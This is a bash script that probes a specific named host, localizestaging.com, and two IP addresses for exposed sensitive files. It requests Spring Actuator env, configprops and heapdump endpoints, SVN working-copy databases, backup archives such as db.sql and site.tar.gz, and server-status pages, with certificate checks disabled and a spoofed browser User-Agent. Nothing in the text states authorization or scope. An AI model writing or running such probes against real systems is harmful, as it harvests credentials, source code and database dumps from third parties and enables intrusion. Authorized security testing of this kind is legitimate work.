#!/usr/bin/env bash
# localize_probe.sh — lightweight curl probe for confirmed exposures
# Target: localizestaging.com (172.66.40.216/32, 172.66.43.40/32)
# Usage: bash localize_probe.sh

set -euo pipefail
BASE="https://localizestaging.com"
HOST_HDR="Host: localizestaging.com"
UA="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

curl_probe() {
  local path="$1"
  local method="${2:-GET}"
  echo "--- $method $path ---"
  curl -sS -k -X "$method" "$BASE$path" -H "$HOST_HDR" -H "$UA" --max-time 15 -w "\nHTTP_CODE:%{http_code}\nSIZE:%{size_download}\nCONTENT_TYPE:%{content_type}\n" -o - | head -c 4096
  echo ""
}

echo "[+] Probing Spring Actuator endpoints..."
curl_probe "/actuator/env"
curl_probe "/actuator/configprops"
curl_probe "/actuator/info"
curl_probe "/actuator/health"
curl_probe "/actuator/metrics"
curl_probe "/actuator/heapdump" HEAD

echo "[+] Probing SVN metadata..."
curl_probe "/.svn/entries"
curl_probe "/.svn/wc.db"
curl_probe "/.svn/all-wcprops"

echo "[+] Probing backup archives..."
curl_probe "/backup/"
curl_probe "/backup/db.sql" HEAD
curl_probe "/backup/site.tar.gz" HEAD

echo "[+] Probing server status / debug..."
curl_probe "/server-status"
curl_probe "/debug/metrics"

echo "[+] Done."
